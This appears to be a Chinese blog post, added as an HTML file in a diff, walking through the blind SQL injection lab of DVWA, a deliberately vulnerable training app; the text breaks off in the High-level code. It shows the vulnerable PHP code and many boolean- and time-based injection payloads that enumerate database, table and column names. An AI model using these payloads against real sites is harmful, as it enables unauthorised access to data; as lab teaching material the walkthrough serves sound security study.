@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="DVWA教程," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="清沐园 | wlfsky" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
+<meta name="keywords" content="DVWA教程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA之SQL Injection(Blind)">
+<meta property="og:url" content="http://wlfsky.com/2018/01/18/DVWA之SQL-Injection-Blind/index.html">
+<meta property="og:site_name" content="清沐园 | wlfsky">
+<meta property="og:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-1.png">
+<meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-blind-1.png">
+<meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-blind-1.png">
+<meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-blind-2.png">
+<meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-13.png">
+<meta property="og:updated_time" content="2018-01-18T04:36:38.161Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DVWA之SQL Injection(Blind)">
+<meta name="twitter:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
+<meta name="twitter:image" content="http://wlfsky.com/img/dvwa-sql-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://wlfsky.com/2018/01/18/DVWA之SQL-Injection-Blind/"/>
+
+
+
+
+
+  <title>DVWA之SQL Injection(Blind) | 清沐园 | wlfsky</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/wlfreesky"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">清沐园 | wlfsky</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">我们终其一生都在寻找</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/life/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wlfsky.com/2018/01/18/DVWA之SQL-Injection-Blind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wlfsky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/cathand.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="清沐园 | wlfsky">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">DVWA之SQL Injection(Blind)</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-18T10:20:21+08:00">
+                2018-01-18
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-01-18T12:36:38+08:00">
+                2018-01-18
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-book"> 本文总阅读量</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,398
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <pre><code>作者：wlfsky
+格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
+</code></pre><a id="more"></a>
+<hr>
+<p><strong><em>本文参考自 FreeBuf.COM：lonehand</em></strong></p>
+<h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
+<p>DVWA共有十个模块，分别是</p>
+<blockquote>
+<p>Brute Force（蛮力攻击）</p>
+<p>Command Injection（命令行注入）</p>
+<p>CSRF（跨站请求伪造）</p>
+<p>File Inclusion（文件包含）</p>
+<p>File Upload（文件上传）</p>
+<p>Insecure CAPTCHA （不安全的验证码）</p>
+<p>SQL Injection（SQL注入）</p>
+<p>SQL Injection（Blind）（SQL盲注）</p>
+<p>XSS（Reflected）（反射型跨站脚本）</p>
+<p>XSS（Stored）（存储型跨站脚本）</p>
+</blockquote>
+<p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p>
+<p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p>
+<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a><strong>SQL Injection</strong> <strong>(Blind)</strong></h2><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
+<h3 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a><strong>手工盲注思路</strong></h3><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
+<p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。</p>
+<p>下面简要介绍手工盲注的步骤（可与之前的<a href="http://wlfsky.com/2018/01/17/DVWA之SQL-Injection">手工注入</a>作比较）：</p>
+<blockquote>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>2.猜解当前数据库名</p>
+<p>3.猜解数据库中的表名</p>
+<p>4.猜解表中的字段名</p>
+<p>5.猜解数据</p>
+</blockquote>
+<p>下面对四种级别的代码进行分析。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID exists in the database.</span><br></pre></td></tr></table></figure>
+<p>与</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID is MISSING from the database.</span><br></pre></td></tr></table></figure>
+<p>，因此这里是SQL盲注漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>首先演示<strong>基于布尔的盲注</strong>：</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，显示相应用户存在：</p>
+<p><img src="/img/dvwa-sql-blind-1.png" alt="dvwa-sql-blind-1.png"></p>
+<p>输入1’ and 1=1 #，显示存在：</p>
+<p><img src="/img/dvwa-sql-blind-1.png" alt="dvwa-sql-blind-1.png"></p>
+<p>输入1’ and 1=2 #，显示不存在：</p>
+<p><img src="/img/dvwa-sql-blind-2.png" alt="dvwa-sql-blind-2.png"></p>
+<p>说明存在字符型的SQL盲注。</p>
+<h3 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
+<blockquote>
+<p>输入1’ and length(database())=1 #，显示不存在；</p>
+<p>输入1’ and length(database())=2 #，显示不存在；</p>
+<p>输入1’ and length(database())=3 #，显示不存在；</p>
+<p>输入1’ and length(database())=4 #，显示存在：</p>
+</blockquote>
+<p>说明数据库名长度为4。</p>
+<p>下面采用二分法猜解数据库名。</p>
+<blockquote>
+<p>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
+<p>输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
+<p>输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
+<p>输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
+<p>输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p>
+<p>输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p>
+<p>…</p>
+</blockquote>
+<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p>
+<h3 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
+<blockquote>
+<p>1’ and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</p>
+<p>1’ and (select count(table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</p>
+</blockquote>
+<p>说明数据库中共有两个表。（注意：count和（table_name）中间不能有空格）</p>
+<p>接着挨个猜解表名长度：</p>
+<blockquote>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p>
+<p>…</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</p>
+</blockquote>
+<p>说明第一个表名长度为9。</p>
+<p>然后猜解表名：</p>
+<blockquote>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</p>
+</blockquote>
+<p>说明第一个表的名字的第一个字符为小写字母g。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
+<h3 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
+<blockquote>
+<p>1’ and (select count(column_name) from information_schema.columns where table_name= ‘users’)=1 # 显示不存在</p>
+<p>…</p>
+<p>1’ and (select count(column_name) from information_schema.columns where table_name= ‘users’)=8 # 显示存在</p>
+</blockquote>
+<p>说明users表有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<blockquote>
+<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p>
+<p>…</p>
+<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</p>
+</blockquote>
+<p>说明users表的第一个字段为7个字符长度。</p>
+<p>采用二分法，即可猜解出所有字段名。</p>
+<h3 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<p>还可以使用<strong>基于时间的盲注</strong>：</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><blockquote>
+<p>输入1’ and sleep(5) #，感觉到明显延迟；</p>
+<p>输入1 and sleep(5) #，没有延迟；</p>
+</blockquote>
+<p>说明存在字符型的基于时间的盲注。</p>
+<h3 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>首先猜解数据名的长度：</p>
+<blockquote>
+<p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</p>
+</blockquote>
+<p>说明数据库名长度为4个字符。</p>
+<p>接着采用二分法猜解数据库名：</p>
+<blockquote>
+<p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
+<p>…</p>
+<p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p>
+<p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p>
+<p>说明数据库名的第一个字符为小写字母d。</p>
+<p>…</p>
+</blockquote>
+<p>重复上述步骤，即可猜解出数据库名(dvwa)。</p>
+<h3 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
+<blockquote>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</p>
+</blockquote>
+<p>说明数据库中有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<blockquote>
+<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</p>
+</blockquote>
+<p>说明第一个表名的长度为9个字符。</p>
+<p>采用二分法即可猜解出表名。</p>
+<h3 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
+<blockquote>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p>
+<p>…</p>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</p>
+</blockquote>
+<p>说明users表中有8个字段。</p>
+<p>接着挨个猜解字段长度：</p>
+<blockquote>
+<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</p>
+</blockquote>
+<p>说明users表的第一个字段长度为7个字符。</p>
+<p>然后采用二分法即可猜解出各个字段名。</p>
+<h3 id="5-猜解数据-1"><a href="#5-猜解数据-1" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
+<p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
+<p><img src="/img/dvwa-sql-13.png" alt="dvwa-sql-13.png"></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p>
+<p>之前已经介绍了详细的盲注流程，这里就简要演示几个。</p>
+<p>首先是<strong>基于布尔的盲注</strong>：</p>
+<blockquote>
+<p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
+<p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p>
+</blockquote>
+<p>然后是<strong>基于时间的盲注</strong>：</p>
+<blockquote>
+<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
+<p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
+</blockquote>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">'id'</span> ] ) ) &#123; </span><br><span 